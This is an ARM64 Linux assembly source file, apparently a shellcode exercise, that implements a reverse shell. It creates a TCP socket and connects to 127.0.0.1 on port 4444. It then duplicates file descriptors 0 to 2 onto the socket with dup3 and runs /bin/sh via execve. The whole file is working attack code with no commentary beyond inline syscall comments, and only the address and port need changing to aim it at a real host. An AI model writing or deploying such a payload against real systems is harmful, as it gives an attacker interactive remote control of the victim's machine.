.global _start
.text

_start:
	// socket 
	mov x0, #2		// AF_INET
	mov x1, #1		// SOCK_STREAM
	mov x2, xzr		// protocol
	mov x8,	#198		// socket (/usr/include/asm-generic/unistd.h) 
	svc #0			// invoke socket syscall
	mov x9, x0		// save socket file descriptor

	// connect
	sub sp, sp, #16		// stack space
	mov w0, #2		// AF_INET (sockaddr_in)
	strh w0, [sp]
	mov w1, #0x5c11		// htons(4444) (sockaddr_in)
	strh w1, [sp, #2]
	ldr w2, =0x0100007f	// INADDR_LOOPBACK (sockaddr_in)
	str w2, [sp, #4] 
	
	mov x0, x9		// sockfd
	mov x1, sp		// struct address
	mov x2, #16		// struct size
	mov x8,	#203		// connect (/usr/include/asm-generic/unistd.h) 
	svc #0			// invoke connect syscall

	// dup3 loop
	mov x10, xzr		// loop counter = 0

dup3loop:
	mov x0, x9		// acceptfd
	mov x1, x10		// newfd
	mov x2, xzr		// flags = 0		
	mov x8, #24		// dup3 (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke dup3 syscall
	add x10, x10, #1	// inc counter
	cmp x10, #3		// compare counter with 3
	blt dup3loop		// loop while newfd < 3

	// execve
	adr x0, shell		// "/bin/sh"
	mov x1, xzr		// argv
	mov x2, xzr		// envp	
	mov x8, #221		// execve (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke execve syscall

shell:
	.asciz "/bin/sh"
